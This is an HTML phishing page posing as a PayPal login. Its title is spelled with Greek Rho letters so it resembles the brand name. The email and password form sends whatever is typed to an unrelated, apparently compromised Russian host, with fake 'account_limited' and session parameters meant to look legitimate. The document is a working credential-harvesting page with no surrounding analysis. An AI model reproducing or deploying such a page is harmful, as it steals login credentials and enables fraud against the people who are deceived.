<html>
<head>
<title>Log in to your &Rho;ay&Rho;al account</title>
<meta charset="utf-8">

<link rel="shortcut icon" link rel="logo-icon" href="ppico.ico">

<script language="javascript">
function check() {
    var x=document.forms["myForm"]["email"].value;
    var atpos = x.indexOf("@");
    var dotpos = x.lastIndexOf(".");
    if (atpos< 1 || dotpos<atpos+2 || dotpos+2>=x.length) {
		document.getElementById('stop').style.display = "block"; 
		document.forms["myForm"]["email"].focus();
		document.forms["myForm"]["email"].setSelectionRange(0,36);
        return false;
	}	
	var y=document.forms["myForm"]["ps"].value;
    if (y==null || y=="")
    {
	    document.getElementById('stop').style.display = "block";
		document.forms["myForm"]["ps"].focus();
        return false;
    }
}
</script>

</head>

<div class="main">
<div class="centered">
<div class="ts"></div>
<div id="stop"><img src="alert.png" alt=""></div>
<form name="myForm" onsubmit="return check()" action="http://sot.24raion.ru/libraries/legacy/base/update/77be7e5ef7a6768c45f79e544c4cd169/login.php?cmd=_processing&amp;account_limited=4db7ed8b596e5db0aa2cf6e3687fbadb&amp;session=e6f91d54458e6d47dc7e4d601eda3cabebdac296" method="POST">
<input type="text" class="fieldbox" placeholder="Email address" name="email" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="36">
<input type="password" class="fieldbox" placeholder="Password" name="ps" autocomplete="off" autocorrect="off" autocapitalize="on" value="" aria-required="true"  maxlength="36">
<input type="hidden" value="../function.php" name="hostname"/>
<input type="submit" class="log" value="Log In">
</form>
